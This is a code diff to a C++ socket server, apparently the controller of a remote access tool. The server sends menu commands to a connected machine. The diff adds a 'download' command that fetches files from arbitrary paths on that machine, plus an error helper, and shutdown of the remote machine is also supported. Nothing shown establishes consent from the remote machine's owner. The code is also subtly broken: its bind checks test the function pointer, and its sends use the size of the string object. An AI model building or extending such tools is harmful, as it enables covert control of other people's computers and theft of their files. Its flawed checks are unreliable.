@@ -12,7 +12,6 @@
 
 
 #ifdef __linux__
-	#define WIN 0
 	#include <arpa/inet.h>
 	#include <unistd.h>
 	#include <stdlib.h>
@@ -21,6 +20,8 @@
 #else
 	#include <winsock2.h>
 	#include <windows.h>
+
+	#pragma optimize("gsy", on)
 	#pragma comment(lib, "ws2_32.lib")
 	#pragma warning(disable: 4996)
 #endif
@@ -28,6 +29,7 @@
 
 
 #include <iostream>
+#include <fstream>
 #include <string>
 
 #include "Menu.h"
@@ -37,7 +39,18 @@
 char buffer[100000];
 std::string command, path, key;
 
+void throw_error(const char* error_text);
 
+inline bool dirExists(const std::string& dirName_in) {
+	DWORD ftyp = GetFileAttributesA(dirName_in.c_str());
+	if (ftyp == INVALID_FILE_ATTRIBUTES)
+		return false;
+
+	if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
+		return true;
+
+	return false;
+}
 
 int main() {
 #ifdef __linux__
@@ -65,6 +78,7 @@ int main() {
 	
 	SOCKET sListen = socket(AF_INET, SOCK_STREAM, NULL);
 	bind(sListen, (SOCKADDR*)&addr, sizeof(addr));
+	if (!bind) throw_error("binding error");
 	listen(sListen, SOMAXCONN);
 
 	std::cout << "["; timenow(); std::cout << "]" << " platform: ";
@@ -94,6 +108,7 @@ int main() {
 	addr.sin_port = htons(PORT);
 	addr.sin_addr.s_addr = inet_addr(IP);
 	bind(sock, (struct sockaddr*)&addr, sizeof(addr));
+	if (!bind) throw_error("binding error");
 	listen(sock, 1);
 	std::cout << "["; timenow(); std::cout << "]" << " platform:" << wh_blue << " linux\n" << st_end;
 	std::cout << "["; timenow(); std::cout << "]" << " [" << red << "start" << st_end << "] server " << green << IP << st_end << ":" << red << PORT << st_end << std::endl;
@@ -102,10 +117,7 @@ int main() {
 	
 #endif
 
-	if (!conn) {
-		std::cout << "Error accept\n";
-		return -1;
-	}
+	if (!conn) throw_error("accept < 1");
 	else {
 		std::cout << "["; timenow(); std::cout << "]" << " Sucessful Connected!\ntype help to print HELP [MENU]\n";
 		while (true) {
@@ -211,6 +223,45 @@ int main() {
 				std::cout << buffer << std::endl;
 			}
 
+			else if (command == "download") {
+				std::string file_name = "1.txt";
+				send(conn, command.c_str(), sizeof(command), NULL);
+				std::cout << "full path to file => ";
+				std::getline(std::cin, path);
+
+				// get file name
+				std::string temp_file_name;
+				for (unsigned int item = 0; item < path.length(); ++item) {
+					if ((path[item] == '\\') || (path[item] == '/')) {
+						temp_file_name = "";
+						for (unsigned int i = item+1; i < path.length(); ++i) {
+							temp_file_name += path[i];
+						}
+					}
+				}
+
+
+				send(conn, path.c_str(), sizeof(path), NULL);
+				std::cout << "wait ...\n";
+				recv(conn, buffer, sizeof(buffer), NULL);
+
+				if (!dirExists("downloads")) _wmkdir(L"downloads");
+				if (!strcmp(buffer, "exist")) {
+					std::cout << "[";
+					timenow();
+					std::cout << "]";
+					std::cout << " file exist\n";
+				}
+				else {
+					std::ofstream wr("downloads\\" + temp_file_name, std::ios::binary);
+					wr << buffer;
+					std::cout << "[";
+					timenow();
+					std::cout << "]";
+					std::cout << " download: /downloads/" << temp_file_name << " succes\n";
+				}
+			}
+
 			else if (command == "shutdown") {
 				send(conn, command.c_str(), sizeof(command), NULL);
 				std::cout << "ok\n";
@@ -245,4 +296,17 @@ int main() {
 		}
 	}
 	return 0;
+}
+
+void throw_error(const char* error_text) {
+#ifndef __linux__
+	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
+	SetConsoleTextAttribute(hConsole, 12);
+	std::cout << "error: ";
+	SetConsoleTextAttribute(hConsole, 7);
+	std::cout << error_text << std::endl;
+#else
+	std::cout << red << "error: " << st_end << error_text << std::endl;
+#endif
+	exit(1);
 }
